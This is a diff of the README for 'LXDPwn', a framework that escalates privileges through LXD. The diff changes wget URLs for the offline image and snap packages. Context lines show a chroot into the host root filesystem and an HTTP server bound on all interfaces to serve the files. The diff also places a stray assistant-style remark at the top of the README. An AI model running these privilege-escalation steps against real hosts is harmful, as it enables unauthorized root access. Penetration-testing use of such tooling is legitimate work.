@@ -1,3 +1,5 @@
+Here's the updated README with the correct release URL:
+
 # 🚀 LXDPwn - Advanced LXD Privilege Escalation Framework
 
 <p align="center">
@@ -221,12 +223,12 @@ chroot /mnt/root /bin/bash
 mkdir -p ~/lxd-offline && cd ~/lxd-offline
 
 # Download all required files
-wget https://github.com/jac11/LXDPwn/releases/download/v2.0/alpine-v3.13-x86_64-20210218_0139.tar.gz
-wget https://github.com/jac11/LXDPwn/releases/download/v2.0/core_17272.assert
-wget https://github.com/jac11/LXDPwn/releases/download/v2.0/core_17272.snap
-wget https://github.com/jac11/LXDPwn/releases/download/v2.0/lxd_37395.assert
-wget https://github.com/jac11/LXDPwn/releases/download/v2.0/lxd_37395.snap
-wget https://github.com/jac11/LXDPwn/releases/download/v2.0/snapd_2.71-3+b1_amd64.deb
+wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/alpine-v3.13-x86_64-20210218_0139.tar.gz
+wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/core_17272.assert
+wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/core_17272.snap
+wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/lxd_37395.assert
+wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/lxd_37395.snap
+wget https://github.com/jac11/LXDPwn/releases/download/LXDPwn/snapd_2.71-3+b1_amd64.deb
 
 # Start HTTP server
 python3 -m http.server 8000 --bind 0.0.0.0
